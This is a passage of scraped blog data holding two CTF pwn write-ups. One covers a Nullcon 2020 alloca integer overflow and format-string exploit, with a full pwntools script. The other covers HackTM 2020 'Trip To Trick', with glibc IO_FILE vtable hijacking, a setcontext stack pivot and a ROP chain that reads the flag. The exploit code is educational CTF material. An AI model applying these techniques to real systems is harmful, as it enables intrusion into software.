setbuf(stdin, 0LL); setbuf(stdout, 0LL); if ( unk_20105C ) &#123; v7 = 200; &#125; else &#123; if ( !fgets(&amp;s, 100, stdin) ) return 0xFFFFFFFFLL; v7 = atoi(&amp;s); &#125; v4 = alloca(16 * (((__int16)v7 + 30LL) / 0x10uLL)); qword_201060 = (const char *)(16 * ((unsigned __int64)&amp;v6 &gt;&gt; 4)); read(0, (void *)(16 * ((unsigned __int64)&amp;v6 &gt;&gt; 4)), v7); printf(qword_201060); if ( unk_20105C ) &#123; read(0, &amp;s, 0LL); printf(\"JK, you lose!\"); _exit(0); &#125; ++unk_20105C; return 0LL;&#125; We can achieve a buffer overflow by causing an integer overflow in the operations inside alloca, by sending a negative number will cause alloca to create a smaller buffer in the stack than the inputted string:12345678else &#123;if ( !fgets(&amp;s, 100, stdin) ) return 0xFFFFFFFFLL; v7 = atoi(&amp;s); // Negative values&#125;v4 = alloca(16 * (((__int16)v7 + 30LL) / 0x10uLL)); // integer overflow in this operations causing a smaller buffer then the input that will come nextqword_201060 = (const char *)(16 * ((unsigned __int64)&amp;v6 &gt;&gt; 4));read(0, (void *)(16 * ((unsigned __int64)&amp;v6 &gt;&gt; 4)), v7); // input will be bigger than the buffer We can leak and get arbirtrary write by using a format string vulnerability in printf: 1printf(qword_201060); // format string vulnerability Plan Leak libc and pie addresses Find a way to return to main Overwrite exit got address Find a way to return to mainThe most difficulty part of the challenge was to find a way to return to main, the pie is enabled so we can’t overwrite the global offset table or a global variable without leaking the PIE base address first. My solution resolved on overflowing the last byte of the return address, in the c language after returning from the main function our program will jump into a location in __libc_start_main and execute exit with the value returned by the main function. If we modify the last byte we can prevent the execution of exit and rerun the code that the program used to call main in the beginning. If you are used to using gdb you should have already noticed after the entry point there is a moment at _libc_start_main when you reach assembly instruction call rax the rax register contains a pointer to the begining of main. We just need to find the right place to jump in _libc_start_main and since ASLR doesn’t affect the last 3 numbers of a libc address it’s completely fine to only overflow the last byte, after some debugging I found a byte that will work for this libc version (2.23) 0xa8: 1r.send(\" %27$lx\"+'A'*0x80+'\\xa8') # overwrite last byte of return address to jump to another _libc_main loc Leaking pie and libcThis can be done with the format string vulnerability itself, the libc address will show up after we overflow the buffer, we also need to leak PIE because we need the offsets to the global offset table we can find a pie address at the 27th position of the stack: “%lx” because we want to leak a 64 bit pointer:1r.send(\" %27$lx\"+'A'*0x80+'\\xa8') Then is just a matter of calculating the offsets(0x208a8,0x880) by using gdb:123456789output = r.recvuntil('\\x7f')LIBC = u64(output[-6:].ljust(8,'\\x00'))-0x208a8 # libc leakPIE = int(output[:14],16)-0x880 # geting pielog.info(\"LIBC_BASE 0x%x\"%u64(output[-6:].ljust(8,'\\x00')))log.info(\"LIBC_BASE 0x%x\"%LIBC)log.info(\"PIE 0x%x\"%PIE)ONE_GADGET = LIBC+0xf1147 Overwriting exit got addressI spent a lot of time here unnecessarily, to modify the address of exit_got we just need to modify last 1/2 bytes, instead I just modified everything spending a lot of time, while this is a good exercise is not very funny spending a lot of time figuring out a way to write a complete libc address during a competition, my solution resolved around sorting the HIGH,LOW addresses and do 3 writes: 123456789101112131415161718192021222324252627282930ONE_GADGET = LIBC+0xf1147# this is the reason why you should learn about format string libraries and saves you a lot of time WIN_LOW_0 = ONE_GADGET &amp; 0xffffWIN_LOW_1 = (ONE_GADGET &amp; 0xffff0000) &gt;&gt; 16WIN_HIGH = ONE_GADGET &gt;&gt; 32addresses = [(WIN_LOW_0,1), (WIN_LOW_1,2), (WIN_HIGH,3)]addresses.sort(key=lambda x: x[0])log.info(\"ONE_GADGET 0x%x\" % ONE_GADGET)log.info(\"WIN_LOW_0 0x%x\" % WIN_LOW_0)log.info(\"WIN_LOW_1 0x%x\" % WIN_LOW_1)log.info(\"WIN_HIGH 0x%x\" % WIN_HIGH)log.info(\"GOT EXIT 0x%x\" % (PIE+elf.got['_exit']))getstr = &#123;1:'%&#123;&#125;x%13$hn', 2:'%&#123;&#125;x%14$hn', 3:'%&#123;&#125;x%15$hn'&#125;s = ''s += '%13$ln' # clears the already existing got addresss += getstr[addresses[0][1]].format(addresses[0][0]) s += getstr[addresses[1][1]].format(addresses[1][0]-addresses[0][0])s += getstr[addresses[2][1]].format(addresses[2][0]-addresses[1][0])s += ' '*(56-len(s))s += p64(PIE+elf.got['_exit'])#'B'*8s += p64(PIE+elf.got['_exit']+2)#'A'*8s += p64(PIE+elf.got['_exit']+4)#'C'*8s += \"\\n\"r.send(s) Also a format string library could also be used but I’m very lazy in starting learning how to use one. The full exploit code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *host, port = \"pwn2.ctf.nullcon.net\", \"5003\"filename = \"./challenge\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.23.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)context.terminal = ['tmux', 'new-window']r = getConn()if not args.REMOTE and args.GDB: debug([0x9D8])r.sendline('-1')#context.log_level='debug'r.send(\" %27$lx\"+'A'*0x80+'\\xa8') # overwrite last byte of return address to jump to another _libc_main locoutput = r.recvuntil('\\x7f')LIBC = u64(output[-6:].ljust(8,'\\x00'))-0x208a8 # libc leakPIE = int(output[:14],16)-0x880 # geting pielog.info(\"LIBC_BASE 0x%x\"%u64(output[-6:].ljust(8,'\\x00')))log.info(\"LIBC_BASE 0x%x\"%LIBC)log.info(\"PIE 0x%x\"%PIE)ONE_GADGET = LIBC+0xf1147# this is the reason why you should learn about format string libraries saves you a lot of time WIN_LOW_0 = ONE_GADGET &amp; 0xffffWIN_LOW_1 = (ONE_GADGET &amp; 0xffff0000) &gt;&gt; 16WIN_HIGH = ONE_GADGET &gt;&gt; 32addresses = [(WIN_LOW_0,1), (WIN_LOW_1,2), (WIN_HIGH,3)]addresses.sort(key=lambda x: x[0])log.info(\"ONE_GADGET 0x%x\" % ONE_GADGET)log.info(\"WIN_LOW_0 0x%x\" % WIN_LOW_0)log.info(\"WIN_LOW_1 0x%x\" % WIN_LOW_1)log.info(\"WIN_HIGH 0x%x\" % WIN_HIGH)log.info(\"GOT EXIT 0x%x\" % (PIE+elf.got['_exit']))getstr = &#123;1:'%&#123;&#125;x%13$hn', 2:'%&#123;&#125;x%14$hn', 3:'%&#123;&#125;x%15$hn'&#125;s = ''s += '%13$ln' # clears the already existing got addresss += getstr[addresses[0][1]].format(addresses[0][0]) s += getstr[addresses[1][1]].format(addresses[1][0]-addresses[0][0])s += getstr[addresses[2][1]].format(addresses[2][0]-addresses[1][0])s += ' '*(56-len(s))s += p64(PIE+elf.got['_exit'])#'B'*8s += p64(PIE+elf.got['_exit']+2)#'A'*8s += p64(PIE+elf.got['_exit']+4)#'C'*8s += \"\\n\"r.send(s)r.interactive()r.close()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Format String","slug":"Pwn/x64/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"nullcon2020","slug":"nullcon2020","permalink":"https://teamrocketist.github.io/tags/nullcon2020/"}]},{"title":"[Pwn] HackTM 2020 - Trip To Trick","slug":"Pwn-HackTM-2020-Trip-To-Trick","date":"2020-02-05T15:46:42.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/","link":"","permalink":"https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/","excerpt":"","text":"Trip To Trick Description:492 Points Author:NextLineFlag Path: /home/pwn/flag nc 138.68.67.161 20006 trip_to_trick c6fd4ef7c34c528668edd62914a79602 libc.so.6 2fb0d6800d4d79ffdc7a388d7fe6aea0 TLDR Set _IO_2_1_stdin_-&gt;file-&gt;_IO_BUF_END = STDIN+0x2000 Next scanf will have full control of IO_FILE structures STDOUT-&gt;vtable = _IO_helper_jumps &amp; STDOUT-&gt;flags=0x0 to bypass vtable checker and mprotect of _IO_file_jumps In libc-2.29 vtables are writeable again so we can control rip by changing the value of _IO_helper_jumps-&gt;__finish Set _IO_helper_jumps-&gt;__finish=setcontext+0x35 to obtain stack pivot. Construct a ropchain to open/read/print the file ChallengeI didn’t solve this challenge during ctf time, but I spent a lot of time trying to do it, perhaps in the end I had the opportunity to speak with a guy who solved named stan from discord which told me his solution. I eventually ended up implementing it, I learned a lot of new things about the IO_FILE struct, huge thanks to him for leading me into the right path in this challenge. Information extractionFile12$ file trip_to_tricktrip_to_trick: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9ba40c68c917a91e11558eceaffd3e006531a6d9, for GNU/Linux 3.2.0, not stripped Security1234567$ checksec trip_to_trick[*] '/ctf/work/pwn/TripToTrick/trip_to_trick' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Static analysisMain function1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; _QWORD *v4; // [rsp+18h] [rbp-18h] __int64 v5; // [rsp+20h] [rbp-10h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); v5 = 0LL; sandbox(argc, argv, envp); nohack(); main_init(argc); printf(\"gift : %p\\n\", &amp;system); printf(\"1 : \"); __isoc99_scanf(\"%llx %llx\", &amp;v4, &amp;v5); *v4 = v5; printf(\"2 : \"); __isoc99_scanf(\"%llx %llx\", &amp;v4, &amp;v5); *v4 = v5; fclose(stdout); fclose(stdin); fclose(stderr); return 0;&#125; There’s not much in the main from it we can get: free libc leak two arbitrary writes (scanfs) fclose(stdout), fclose(stdin) and fclose(stderr) (important for the exploit). sandbox function12345678910111213141516171819202122232425262728__int64 sandbox()&#123; __int64 v1; // [rsp+8h] [rbp-8h] v1 = seccomp_init(0LL); if ( !v1 ) &#123; puts(\"seccomp error\"); exit(0); &#125; seccomp_rule_add(v1, 2147418112LL, 15LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 3LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 10LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 9LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 12LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 231LL, 0LL); if ( (int)seccomp_load(v1) &lt; 0 ) &#123; seccomp_release(v1); puts(\"seccomp error\"); exit(0); &#125; return seccomp_release(v1);&#125; The author uses seccomp to only allow a few syscalls: 12345678910sym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 0xf, 0); # SCMP_ACT_ALLOW sys_rt_sigreturnsym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 3, 0); # sys_closesym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 10, 0); # sys_mprotectsym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 9, 0); # sys_mmapsym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 0xc, 0); # sys_brksym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 2, 0); # sys_opensym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 0, 0); # sys_readsym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 1, 0); # sys_writesym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 0x3c, 0); # sys_exitsym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 0xe7, 0); # sys_exit_group So we don’t have execve syscall so we can’t get a proper shell, but we still have sys_write,sys_read,sys_write which can be used to read the flag file from a path location. nohack function123456789int nohack()&#123; if ( ((_WORD)stdout + 2208) &amp; 0xFFF ) &#123; puts(\"mprotect error\"); exit(1); &#125; return mprotect(&amp;stdout[10]._IO_write_end, 0x700uLL, 1);&#125; In libc-2.29 the permissions to write in vtables are enabled so the author decided to make them read only but he did a mistake in setting the ranges, he missed a couple of tables: Blocked vtables from the author: _IO_wfile_jumps_mmap _IO_wfile_jumps _IO_wmem_jumps _IO_mem_jumps _IO_strn_jumps _IO_obstack_jumps _IO_file_jumps_maybe_mmap _IO_file_jumps_mmap _IO_file_jumps _IO_str_jumps Unblocked vtables: _IO_helper_jumps _IO_cookie_jumps _IO_proc_jumps _IO_str_chk_jumps _IO_wstrn_jumps _IO_wfile_jumps_maybe_mmap Because of this the only thing we need to do is to change the vtable pointer into one of the writeable vtables to get control of rip. Get arbitrary write with “unlimited” inputFirst thing we notice is that we have two very limited arbitrary writes with a max size of long long and we can only change two locations in memory. This is the uninitialised _IO_2_1_stdin_:What happens next depends on setvbuf option:123456int main_init()&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); return setvbuf(stderr, 0LL, 2, 0LL);&#125; From here we know the option used is _IONBF which means “No buffering” the buffer is not used. Each I/O operation is written as soon as possible. This a usual thing in ctfs to disable buffering of stdout, stdin and stderr and this time is very handy for us because instead of allocating a new buffer on the heap, the limits of _IO_buf_base and _IO_buf_end will be defined with pointers within stdin where _IO_buf_end-_IO_buf_base = 1 saving only 1 character which will be the end line character (‘\\n’ or ‘’ depends on the input). Here is the stdin after being initialized by setvbuf:If we use the first scanf to increase the value of stdio-&gt;_IO_buf_end, instead of only controlling the _shortbuf field we will be able to control the contents of what comes next:Also the libc source code can be found at:123456789101112131415161718192021222324if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) // sub must be positive &#123; if (__underflow (fp) == EOF) break; continue; &#125; /* These must be set before the sysread as we might longjmp out waiting for input. */ _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); /* Try to maintain alignment: read a whole number of blocks. */ count = want; if (fp-&gt;_IO_buf_base) &#123; size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base; if (block_size &gt;= 128) count -= want % block_size; // writing in blocks &#125; count = _IO_SYSREAD (fp, s, count); // we want to reach here in order to complete the read Much better images explaining the code above can be found in Angelboy slides. Python code: 1r.sendlineafter('1 : ', \"%x %x\" %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+0x2000)) Filling the memoryFrom the initial plan we know we must change values on _IO_2_1_STDOUT-&gt;file-&gt;vtable, and values on the _IO_helper_jumps vtable but there will be a lot of values in the middle because we are overflowing everything from the very beginning, in this case from the stdin we can’t just fill everything with nulls and expect everything to run smoothly , obviously the program will break if we do that we need to keep an eye on the fields that contain mappable addresses. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 _lock(1st) and _wide_data(2nd) and vtable(last) fields must have a valid mappable address preferable to the original ones(_lock). ^0x7fb4561efa80 &lt;_IO_2_1_stdin_+128&gt;: 0x000000000a000000 |__ 0x00007fb4561f25900x7fb4561efa90 &lt;_IO_2_1_stdin_+144&gt;: 0xffffffffffffffff | 0x00000000000000000x7fb4561efaa0 &lt;_IO_2_1_stdin_+160&gt;: 0x00007fb4561efae0 _| 0x0000000000000000 0x7fb4561efab0 &lt;_IO_2_1_stdin_+176&gt;: 0x0000000000000000 | 0x00000000000000000x7fb4561efac0 &lt;_IO_2_1_stdin_+192&gt;: 0x00000000ffffffff | 0x00000000000000000x7fb4561efad0 &lt;_IO_2_1_stdin_+208&gt;: 0x0000000000000000 |__ 0x00007fb4561f15600x7fb4561efae0 &lt;_IO_wide_data_0&gt;: 0x0000000000000000 0x0000000000000000........0x7fb4561efc10 &lt;_IO_wide_data_0+304&gt;: 0x00007fb4561f1020 0x00000000000000000x7fb4561efc20 &lt;__memalign_hook&gt;: 0x00007fb4560a4190 0x0000000000000000 -&gt; Can be filled with 0s0x7fb4561efc30 &lt;__malloc_hook&gt;: 0x0000000000000000 0x00000000000000000x7fb4561efc40 &lt;main_arena&gt;: 0x0000000000000000 0x0000000000000001-----------|...... |-&gt; Can be filled with 0s0x7fb4561f04d0 &lt;main_arena+2192&gt;: 0x0000000000021000 0x00007fb4560a5a90---|0x7fb4561f0520 &lt;default_overflow_region&gt;: 0x0000000000000000 0x0000000000000001 --| 0x7fb4561f0530 &lt;default_overflow_region+16&gt;: 0x0000000000000002 0x00007fb4561f32d8 | 0x7fb4561f0540 &lt;default_overflow_region+32&gt;: 0x0000000000000000 0xffffffffffffffff | 0x7fb4561f0550 &lt;__libc_utmp_jump_table&gt;: 0x00007fb4561ee6e0 0x00007fb4561c1e48 |-&gt; must be filled 0x7fb4561f0560 &lt;_nl_global_locale&gt;: 0x00007fb4561ec580 0x00007fb4561ecac0 |with the correct ............... |values otherwise 0x7fb4561f0640 &lt;_nl_global_locale+224&gt;: 0x00007fb4561bc678 0x0000000000000000 ----------|page fault. 0x7fb4561f0650: 0x0000000000000000 0x00000000000000000x7fb4561f0660 &lt;_IO_list_all&gt;: 0x00007fb4561f0680 0x0000000000000000 --&gt; Keep this too0x7fb4561f0670: 0x0000000000000000 0x00000000000000000x7fb4561f0680 &lt;_IO_2_1_stderr_&gt;: 0x00000000fbad2087 0x00007fb4561f0703 --|-&gt;calculate the offsets ..... |from the libc_base to0x7fb4561f0750 &lt;_IO_2_1_stderr_+208&gt;: 0x0000000000000000 0x00007fb4561f1560 --|read original values 0x7fb4561f0760 &lt;_IO_2_1_stdout_&gt;: 0x00000000fbad2887 0x00007fb4561f07e3 --|-&gt; Everything remains the .... --|same0x7fb4561f0830 &lt;_IO_2_1_stdout_+208&gt;: 0x0000000000000000 0x00007fb4561f1560 -&gt; Change to _IO_helper_jumps 0x7fb4561f0840 &lt;stderr&gt;: 0x00007fb4561f0680 0x00007fb4561f0760--|-&gt; Stays the same0x7fb4561f0850 &lt;stdin&gt;: 0x00007fb4561efa00 0x00007fb456031e90----------|0x7fb4561f0860 &lt;__elf_set___libc_subfreeres_element_free_mem__&gt;: 0x00007fb45619fdd0--|-&gt; can be filled... |with 0s. 0x7fb4561f0940 &lt;__elf_set___libc_subfreeres_element_pw_map_free__&gt;: 0x00007fb4561a1d10--| 0x7fb4561f0950: 0x0000000000000000 0x0000000000000000 |-&gt; the address that will control RIP0x7fb4561f0960 &lt;_IO_helper_jumps&gt;: 0x0000000000000000 | 0x00000000000000000x7fb4561f0970 &lt;_IO_helper_jumps+16&gt;: 0x00007fb45609ca70_| 0x00007fb45607f5300x7fb4561f0980 &lt;_IO_helper_jumps+32&gt;: 0x00007fb45609c140 0x00007fb45609c1500x7fb4561f0990 &lt;_IO_helper_jumps+48&gt;: 0x00007fb45609d7b0 0x00007fb45609c1b00x7fb4561f09a0 &lt;_IO_helper_jumps+64&gt;: 0x00007fb45609c3b0 0x00007fb45609cae00x7fb4561f09b0 &lt;_IO_helper_jumps+80&gt;: 0x00007fb45609c800 0x00007fb45609c6d00x7fb4561f09c0 &lt;_IO_helper_jumps+96&gt;: 0x00007fb45609ca60 0x00007fb45609c8700x7fb4561f09d0 &lt;_IO_helper_jumps+112&gt;: 0x00007fb45609d910 0x00007fb45609d9200x7fb4561f09e0 &lt;_IO_helper_jumps+128&gt;: 0x00007fb45609d8f0 0x00007fb45609ca600x7fb4561f09f0 &lt;_IO_helper_jumps+144&gt;: 0x00007fb45609d900 0x00000000000000000x7fb4561f0a00 &lt;_IO_helper_jumps+160&gt;: 0x0000000000000000 0x0000000000000000... Now in python, filling stdin:123456789101112131415161718# STDIN+131INPUT2 ='\\x0a'+'\\x00'*4# p64(_IO_STDFILE_0_LOCK)INPUT2 += p64(_IO_STDFILE_0_LOCK)INPUT2 += p64(-0x1, signed=True) # _offsetINPUT2 += p64(0x0) # _codecvtINPUT2 += p64(_IO_WIDE_DATA_0) # _wide_dataINPUT2 += p64(0x0) # _freeres_listINPUT2 += p64(0x0) # _freeres_bufINPUT2 += p64(0x0) # __pad5INPUT2 += p32(-0x1, signed=True) # _modeINPUT2 += p32(0x0) # _unused2INPUT2 += p64(0x0) # _unused2INPUT2 += p64(0x0) # _unused2INPUT2 += p64(_IO_FILE_JUMPS) # vtable\"\"\"INPUT2 += p64(0x0)*19*2 + p64(LIBC+0x1bb020)+p64(0x0)INPUT2 += p64(LIBC+libc.symbols['__memalign_hook']) # __memalign_hookINPUT2 += p64(0x0)INPUT2 += p64(0x0)+p64(0x0) Filling from main_arena until the end of _nl_global_locale:12345678910111213141516INPUT2 += '\\x00'*2208 # MAIN_ARENAINPUT2 += p64(LIBC+0x896b0) + p64(0x0) # obstack_alloc_failed_handlerINPUT2 += p64(LIBC+0x185072)*2 # tznameINPUT2 += p64(0)*4 # program_invocation_short_nameINPUT2 += p64(0)+p64(1)+p64(2)+p64(LIBC+0x1bd2d8)+p64(0)+p64(-0x1,signed=True) # default_overflow_regionINPUT2 += p64(LIBC)+p64(LIBC) # __libc_utmp_jump_table # _nl_global_localeOFFSETLIST = [1971584, 1972928, 1973056, 1975232, 1972480, 1972352, 0, 1974400, 1974496, 1974624, 1974816, 1974944, 1975040, 1680352, 1676512, 1678048, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 1775224, 0]for offset in OFFSETLIST: if offset == 0: INPUT2 += p64(0) else: INPUT2 += p64(LIBC+offset)INPUT2 += p64(0)*2INPUT2 += p64(_IO_LIST_ALL+0x20)+p64(0)*3 # IO_LIST_ALL Filling stderr: 12345678910111213141516171819202122232425262728293031323334# STDERRINPUT2 += p64(0xfbad2887) # _flagsINPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_read_ptrINPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_read_endINPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_read_baseINPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_write_baseINPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_write_ptrINPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_write_endINPUT2 += p64(_IO_2_1_STDERR_+131) # _IO_buf_baseINPUT2 += p64(_IO_2_1_STDERR_+132) # _IO_buf_endINPUT2 += p64(0x0) # _IO_save_baseINPUT2 += p64(0x0) # _IO_backup_baseINPUT2 += p64(0x0) # _IO_save_endINPUT2 += p64(0x0) # _markersINPUT2 += p64(_IO_2_1_STDOUT_) # _chainINPUT2 += p32(0x0) # _filenoINPUT2 += p32(0x0) # _flags2INPUT2 += p64(-0x1, signed=True) # _old_offsetINPUT2 += p16(0x0) # _cur_columnINPUT2 += p8(0x0) # _vtable_offsetINPUT2 += p8(0x0) # _shortbufINPUT2 += p32(0x0) # _shortbufINPUT2 += p64(_IO_STDFILE_2_LOCK) # _lockINPUT2 += p64(-0x1, signed=True) # _offsetINPUT2 += p64(0x0) # _codecvtINPUT2 += p64(_IO_WIDE_DATA_2) # _wide_dataINPUT2 += p64(0x0) # _freeres_listINPUT2 += p64(0x0) # _freeres_bufINPUT2 += p64(0x0) # __pad5INPUT2 += p32(-0x1, signed=True) # _modeINPUT2 += p32(0x0) # _unused2INPUT2 += p64(0x0) # _unused2INPUT2 += p64(0x0) # _unused2INPUT2 += p64(_IO_FILE_JUMPS) # vtable Changing stdout vtable from _IO_file_jumps to _IO_helper_jumps to bypass the mprotect call:12345678910111213141516171819202122232425262728293031323334# STDOUTINPUT2 += p64(0x0) # _flagsINPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_read_ptrINPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_read_endINPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_read_baseINPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_write_baseINPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_write_ptrINPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_write_endINPUT2 += p64(_IO_2_1_STDOUT_+131) # _IO_buf_baseINPUT2 += p64(_IO_2_1_STDOUT_+132) # _IO_buf_endINPUT2 += p64(0x0) # _IO_save_baseINPUT2 += p64(0x0) # _IO_backup_baseINPUT2 += p64(0x0) # _IO_save_endINPUT2 += p64(0x0) # _markersINPUT2 += p64(_IO_2_1_STDIN_) # _chainINPUT2 += p32(0x0) # _filenoINPUT2 += p32(0x0) # _flags2INPUT2 += p64(-0x1, signed=True) # _old_offsetINPUT2 += p16(0x0) # _cur_columnINPUT2 += p8(0x0) # _vtable_offsetINPUT2 += p8(0x0) # _shortbufINPUT2 += p32(0x0) # _shortbufINPUT2 += p64(_IO_STDFILE_1_LOCK) # _lockINPUT2 += p64(-0x1, signed=True) # _offsetINPUT2 += p64(0x0) # _codecvtINPUT2 += p64(_IO_WIDE_DATA_1) # _wide_dataINPUT2 += p64(0x0) # _freeres_listINPUT2 += p64(0x0) # _freeres_bufINPUT2 += p64(0x0) # __pad5INPUT2 += p32(-0x1, signed=True) # _modeINPUT2 += p32(0x0) # _unused2INPUT2 += p64(0x0) # _unused2INPUT2 += p64(0x0) # _unused2INPUT2 += p64(_IO_HELPER_JUMPS) # vtable changed to _IO_HELPER_JUMPS Filling the rest: 12345678INPUT2 += p64(_IO_2_1_STDERR_) # stderrINPUT2 += p64(_IO_2_1_STDOUT_) # stdoutINPUT2 += p64(_IO_2_1_STDIN_) # stdinINPUT2 += p64(0)#print(len(ROP_CHAIN))INPUT2 += '\\x00'*(0x1f*8) # __elf_set___libc_subfreeresINPUT2 += p64(0) Control Rip and stackpivotWe can control RIP by changing _finish from _IO_helper_jumps vtable:And why? because fclose(stdout) will be executed in the main_function, and it uses pointers from the vtable. Fclose closes a file stream, and releases the file pointer and related buffer, it will first call _IO_unlink_it to delink the specified FILE from the _chain list: 12if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); After that will call the system interface to close it: 12if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); Finally, the _IO_FINISH in the vtable is called, which corresponds to the _IO_file_finish function:1_IO_FINISH (fp); Now that we control the rip we need a way to stack pivot, so lets first see the value of the registers when we jump to _IO_FINISH pointer by changing it into 0xdeadbeef: 1234# vtable IO_HELPER_JUMPSINPUT2 += p64(0) _DUMMY1INPUT2 += p64(0) _DUMMY2INPUT2 += p64(0xdeadbeef) # _FINISH GDB image on pagefault:So what is exactly stack pivoting? Stacking pivoting is basically changing the stack pointer to point somewhere else, we want this because this time our ropchain won’t be located in the stack but in libc, if we don’t pivot when executing ret instructions we will just jump into values in the stack which is not what we want, there is a need to change the stack pointer to point into ropchain location. We can control the contents of RDX, to use it we need to find something like mov rsp, qword ptr [rdx]; ret, a gadget like this can be found at setcontext+0x35:So rdx is right at _IO_helper_jumps so we need to put the rop_chain at _IO_helper_jumps + 0xa0 because of the instruction mov rsp, qword ptr [rdx+0xa0];, by changing the stack pointer into the right libc address we can easily do the jumps: 1234567891011121314151617INPUT2 += p64(0)+p64(0)+p64(SETCONTEXT_SPITVOT) # _IO_helper_jumps STACKPIVOT SETCONTEXTPOPRAX = LIBC + 0x0000000000047cf8 # pop rax ; retPOPRDI = LIBC + 0x0000000000026542 # pop rdi ; retPOPRDX = LIBC + 0x000000000012bda6 # pop rdx ; retPOPRSI = LIBC + 0x0000000000026f9e # pop rsi ; retSYSCALL = LIBC + 0x00000000000cf6c5 # syscall ; ret FLAG_PATH = _IO_HELPER_JUMPS+0x178#LIBC+0x1baad8#+16*8ROP_ADDR = _IO_HELPER_JUMPS+0xa8#LIBC+0x1baa08ROP_CHAIN = p64(POPRAX)*2#p64(OPEN)ROP_CHAIN += p64(2) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(0) + p64(SYSCALL) # OPEN(file=flag_path) syscall == 2ROP_CHAIN += p64(POPRAX) + p64(0) + p64(POPRDI) + p64(3) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(0x49) +p64(SYSCALL) # READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0ROP_CHAIN += p64(POPRAX) + p64(1) + p64(POPRDI) + p64(1) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(0x49) +p64(SYSCALL) # WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1ROP_CHAIN += \"flag\\x00\"INPUT2 += '\\x00'*0x88+p64(ROP_ADDR)+ ROP_CHAIN #+ '\\x00'*(190+7+3) + ROP_CHAIN#+ '\\x00'*(0x90-0x88+0x8)+ p64(LIBC) Again we can’t use execve but we can use open, read and write which is enought to solve the challenge. In the end we will be executing this: 123fd= open('flag\\x00', 'r') # fd will be equal to 3read(fd, flag_path, 0x49)write(1, flag_path, 0x49) The reason why fd will be equal to 3 